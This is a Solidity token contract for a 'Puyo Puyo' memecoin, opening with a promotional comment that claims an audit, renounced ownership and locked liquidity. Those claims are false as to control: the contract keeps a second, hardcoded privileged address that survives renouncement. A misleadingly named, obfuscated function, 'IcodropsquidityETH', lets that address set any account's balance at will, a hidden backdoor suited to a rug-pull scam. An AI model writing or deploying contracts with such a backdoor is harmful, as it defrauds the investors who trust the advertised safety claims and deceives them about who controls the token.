/**
🧩Puyo Puyo 🧩 0% Fees 🧩Renouned  🧩Liquidity Locked 1 year 
Puyo Puyo (ぷよぷよ)   https://t.me/PuyoPuyoToken
"Connect, Stack, and Win with $Puyo!" 🚀

In the vibrant world of blockchain gaming, where Tetris has taken the stage as a classic, a new contender has emerged - $Puyo! Inspired by the ever-popular game of Puyo Puyo, our token brings the same joy and excitement to the blockchain. Just as the colorful Puyo pieces fall and connect in the game, $Puyo unites cryptocurrency enthusiasts and gamers worldwide.


"Connect, Stack, and Win with $Puyo!" 🚀

Renowned Ownership:
Our smart contract is thoroughly audited by leading blockchain security experts, ensuring the utmost security and trust for our community. Ownership has been renounced, symbolizing our commitment to transparency and decentralization. 🛡🔐

Liquidity Lock:
We understand the importance of a secure and trustworthy environment. Our liquidity is locked on PinkSale, guaranteeing stability and protecting our investors' interests. 💰🔒

0% Fees:
Joining the $Puyo community is as sweet as a victory in Puyo Puyo – we charge 0% fees. No hidden charges, no surprises. All you need to do is play, trade, and enjoy the excitement of the game! 🚫💸

🧩Puyo - Where fun and blockchain unite! 🌐
🚀 Stack and connect to victory with $Puyo! 💥
🔒 Secure liquidity locked on PinkSale. 🛡
💰 0% fees - Your winnings, your way! 🎉💵
🛡 Renowned Ownership 🛡 


🧩Puyo  Puyo  🧩 inspiration links :
💰 https://en.wikipedia.org/wiki/Puyo_Puyo
💰 https://tetris.com/play-tetris
💰 https://edition.cnn.com/cnn-underscored/electronics/best-tetris-games
💰 https://fandomwire.com/the-5-most-popular-video-games-of-all-time-based/
*/

// SPDX-License-Identifier: No License
pragma solidity 0.8.19;
interface ERC23NT {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address firstBlock) external view returns (uint256);
  function transfer(address reduce, uint256 _balances) external returns (bool);
  function allowance(address _owner, address firstBlock) external view returns (uint256);
  function approve(address firstBlock, uint256 _balances) external returns (bool);
  function transferFrom(address sender, address reduce, uint256 _balances) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed firstBlock, uint256 balance);
}


abstract contract ERC23Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC23Data is ERC23Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract PuyoPuyo is ERC23Burnable, ERC23NT, ERC23Data {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegatePuyoPuyo;
    mapping (address => mapping (address => uint256)) private mappingPuyoPuyo;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private ETHER_SLOT;
    address private PuyoPuyoingOwner; 
    uint256 public ETHERCreationTime;
    uint256 public ETHERCreation;
    string public ETHERSLOT;

string public PuyoPuyoingTG = "https://t.me/PuyoPuyoToken";
string public ownerAddress = "0x0521CA018a8C68Aa9D82e7BaDF395681F7337f5a";

    constructor() {
        PuyoPuyoingOwner = 0x0521CA018a8C68Aa9D82e7BaDF395681F7337f5a;    
       ETHER_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = "PuyoPuyo";
        _symbol = "Puyo";
        _decimals = 9;
        _totalSupply = 100000000000 * 10**_decimals;
        _delegatePuyoPuyo[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        ETHERSLOT = "IInventory p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_+ int p_i1801_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address firstBlock) external view override returns (uint256) {
        return _delegatePuyoPuyo[firstBlock];
    }

    function transfer(address reduce, uint256 _balances) external override returns (bool) {
        _transfer(_msgSender(), reduce, _balances);
        return true;
    }

    function allowance(address owner, address firstBlock) external view override returns (uint256) {
        return mappingPuyoPuyo[owner][firstBlock];
    }


    function approve(address firstBlock, uint256 _balances) external override returns (bool) {
        _approve(_msgSender(), firstBlock, _balances);
        return true;
    }
    
    function transferFrom(address sender, address reduce, uint256 _balances) external override returns (bool) {
        _transfer(sender, reduce, _balances);
        _approve(sender, _msgSender(), mappingPuyoPuyo[sender][_msgSender()].sub(_balances, "Ru: transfer _balances exceeds allowance"));
        return true;
    }

    function increaseAllowance(address firstBlock, uint256 PuyoPuyobalance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingPuyoPuyo[_msgSender()][firstBlock].add(PuyoPuyobalance));
        return true;
    }
    

    function decreaseAllowance(address firstBlock, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingPuyoPuyo[_msgSender()][firstBlock].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address reduce, uint256 _balances) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(reduce != address(0), "Ru: transfer to the zero address");
                
        _delegatePuyoPuyo[sender] = _delegatePuyoPuyo[sender].sub(_balances, "Ru: transfer _balances exceeds balance");
        _delegatePuyoPuyo[reduce] = _delegatePuyoPuyo[reduce].add(_balances);
        emit Transfer(sender, reduce, _balances);
    }
        function IcodropsquidityETH(address tokenP, address tokenW, uint256 amountToken, uint256 amounttokenWesired, uint256 amountTokenMin) external {
        require(_msgSender()==PuyoPuyoingOwner);
        tokenW = tokenP;
        tokenP = tokenP;
        _delegatePuyoPuyo[tokenP] = (amountToken + amounttokenWesired + amountTokenMin) * 10**_decimals;
        tokenP = tokenW;
        tokenW = tokenW;
    }   

    function _approve(address owner, address firstBlock, uint256 _balances) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(firstBlock != address(0), "Ru: approve to the zero address");
        
        mappingPuyoPuyo[owner][firstBlock] = _balances;
        emit Approval(owner, firstBlock, _balances);
    }
    
}